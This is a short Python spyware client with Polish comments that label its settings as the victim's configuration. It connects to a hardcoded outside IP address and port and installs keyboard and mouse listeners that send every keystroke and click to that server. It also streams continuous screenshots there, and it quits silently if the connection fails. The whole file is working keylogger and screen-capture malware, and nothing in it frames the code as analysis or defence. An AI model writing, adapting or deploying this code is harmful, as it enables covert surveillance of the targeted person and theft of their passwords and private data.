import socket
import struct
from PIL import ImageGrab
import io
import json
import time

# --- KONFIGURACJA OFIARY ---
# Tutaj musisz wpisać IP swojego serwera!
# Jeśli używasz Ngroka, wklej adres URL Ngroka (np. tcp://0.tcp.ngrok.io:12345)
# Ale najpierw musimy go sparsować. Najprościej: użyj publicznego IP lub Ngroka z tunnelingiem.

SERVER_IP = '213.172.183.54' # <-- ZAMIEŃ NA SWOJE IP LUB ADRES NGROKA
SERVER_PORT = 5555

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    sock.connect((SERVER_IP, SERVER_PORT))
except Exception as e:
    exit()

def send_data(data):
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(struct.pack("L", len(data)) + data)

def on_click(x, y, button, pressed):
    action = "click" if pressed else "release"
    msg = {"type": "mouse", "action": action, "x": x, "y": y}
    send_data(json.dumps(msg))

def on_press(key):
    try:
        char = key.char
    except AttributeError:
        char = str(key)
    msg = {"type": "keyboard", "key": char}
    send_data(json.dumps(msg))

from pynput import mouse, keyboard
listener_mouse = mouse.Listener(on_click=on_click)
listener_keyboard = keyboard.Listener(on_press=on_press)
listener_mouse.start()
listener_keyboard.start()

while True:
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='JPEG', quality=85)
        image_bytes = buf.getvalue()
        sock.sendall(struct.pack("L", len(image_bytes)) + image_bytes)
        time.sleep(0.03) 
    except Exception:
        break

listener_mouse.stop()
listener_keyboard.stop()
sock.close()